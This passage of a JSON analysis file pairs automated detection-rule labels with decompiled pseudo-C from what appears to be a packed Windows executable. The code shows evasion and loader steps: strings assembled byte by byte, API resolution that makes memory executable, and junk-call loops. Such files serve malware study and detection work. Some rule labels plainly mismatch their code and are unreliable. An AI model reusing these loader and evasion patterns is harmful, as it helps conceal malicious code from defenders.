            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00414510(void)\n\n{\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    *0x2f2b080 = 0x6b;\n    *0x2f2b084 = 0x72;\n    uStack136 = 0x2f2b080;\n    *0x2f2b08c = 0x320033;\n    *0x2f2b094 = 0x6c006c;\n    *0x2f2b086 = 0x6e;\n    *0x2f2b088 = 0x6c0065;\n    *0x2f2b090 = 0x64002e;\n    *0x2f2b082 = 0x65;\n    *0x2f2b098 = 0;\n    uStack140 = 0x414580;\n    *0x2f2b078 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)();\n    uStack104 = 0x605fdad6;\n    uStack48 = 0x3e1d73b5;\n    uStack116 = 0x748a784f;\n    uStack32 = 0x406ee06d;\n    uStack40 = 0x792cf4fa;\n    uStack28 = 0x1681d686;\n    uStack132 = 0x7f744a26;\n    uStack92 = 0x108aa678;\n    uStack64 = 0x2e8d3777;\n    uStack52 = 0x14922f4a;\n    uStack88 = 0x7cab3473;\n    uStack72 = 0x6cac10f2;\n    uStack12 = 0x51eed42d;\n    uStack96 = 0x71cc1e05;\n    uStack16 = 0x17a9a17f;\n    uStack36 = 0xb5fde22;\n    uStack44 = 0x22efe4df;\n    uStack20 = 0xee8079d;\n    uStack60 = 0x2783b42c;\n    uStack120 = 0x77340acd;\n    uStack24 = 0x249a0894;\n    uStack100 = 0x7ded3f3b;\n    uStack124 = 0xd271138d;\n    uStack84 = 0x6df36692;\n    uStack8 = 0x6ce68e74;\n    uStack128 = 0x68f0afd9;\n    uStack112 = 0x1b7f9e8e;\n    uStack80 = 0xd4344e33;\n    uStack76 = 0x9be5cfa;\n    uStack68 = 0x12698b6f;\n    uStack56 = 0xc67ffdbb;\n    uStack108 = 0xfc4e5034;\n    uStack140 = 0x801868;\n    *0x801873 = 0x65;\n    *0x801869 = 0x75747269;\n    *0x80186d = 0x6c61;\n    *0x801868 = 0x56;\n    *0x801874 = 0x7463;\n    *0x801876 = 0;\n    *0x80186f = 0x746f7250;\n    uStack144 = *0x2f2b078;\n    *0x801864 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    (**0x801864)(*0x2f2ab60, *0x2f2b07c, 0x40, &stack0xffffff70);\n    return;\n}\n",
        "token_count": 1023
    },
    "004149b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004149b0(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "004149d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004149d0(void)\n\n{\n    int32_t unaff_ESI;\n    \n    fcn.0040eec0();\n    if (*0x2f2b07c == 0x37) {\n        (*_sym.imp.KERNEL32.dll_SetLocaleInfoW)();\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeA)();\n        (*_sym.imp.KERNEL32.dll_DeleteFileW)();\n        (*_sym.imp.KERNEL32.dll_WriteProfileSectionA)();\n        (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)();\n        (*_sym.imp.KERNEL32.dll_GetFirmwareEnvironmentVariableA)();\n        (*_sym.imp.KERNEL32.dll_GetDevicePowerState)();\n        (*_sym.imp.KERNEL32.dll_ResetEvent)();\n        (*_sym.imp.ADVAPI32.dll_ReportEventW)();\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeMountPointA)();\n    }\n    *(*0x2f2ab60 + unaff_ESI) = *(*0x2f2b490 + 0x38d6 + unaff_ESI);\n    return;\n}\n",
        "token_count": 246
    },
    "00414b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414b30(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + 0x61c88647;\n    return;\n}\n",
        "token_count": 45
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ushort uStack2132;\n    ushort uStack2130;\n    ushort uStack2128;\n    ushort uStack2126;\n    ushort uStack2124;\n    ushort uStack2122;\n    ushort uStack2120;\n    ushort uStack2118;\n    uint uStack2104;\n    uint uStack2100;\n    uint uStack2096;\n    uint uStack2092;\n    uint uStack2088;\n    uchar auStack2084 [16];\n    uchar auStack2068 [2064];\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetDateFormatW;\n    pcVar1 = _sym.imp.KERNEL32.dll_BuildCommDCBAndTimeoutsA;\n    iVar3 = 0x2443831;\n    do {\n        if (*0x2f2b07c == 0x47) {\n            uStack2100 = 0;\n            uStack2096 = 0;\n            uStack2092 = 0;\n            uStack2088 = 0;\n            uStack2104 = 0;\n            (*pcVar1)(0x403974, auStack2084, &uStack2104);\n            uStack2130 = 0;\n            uStack2128 = 0;\n            uStack2126 = 0;\n            uStack2124 = 0;\n            uStack2122 = 0;\n            uStack2120 = 0;\n            uStack2118 = 0;\n            uStack2132 = 0;\n            (*pcVar2)(0, 0, &uStack2132, 0x403988, auStack2068, 0);\n        }\n        iVar3 = iVar3 + -1;\n        *0x2f2b07c = *0x800bd8;\n    } while (iVar3 != 0);\n    uStack2132 = 0x78e1;\n    uStack2130 = 0x51f5;\n    uStack2124 = 0x99d9;\n    uStack2122 = 0xc46f;\n    uStack2128 = 0x34c9;\n    uStack2126 = 0xaad9;\n    *0x2f2b490 = *0x800bcc;\n    fcn.00414d30();\n    return 0;\n}\n",
        "token_count": 524
    },
    "0040baac": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040baac(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.00407d50(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00410412": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00410412(void)\n\n{\n    *0x417db4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x402b7c, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00403cf5": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403cf5(uint lpFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(lpFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.004046b0(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 118
    },
    "00403d25": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint fcn.00403d25(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(param_1);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.004046b0(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 118
    }
}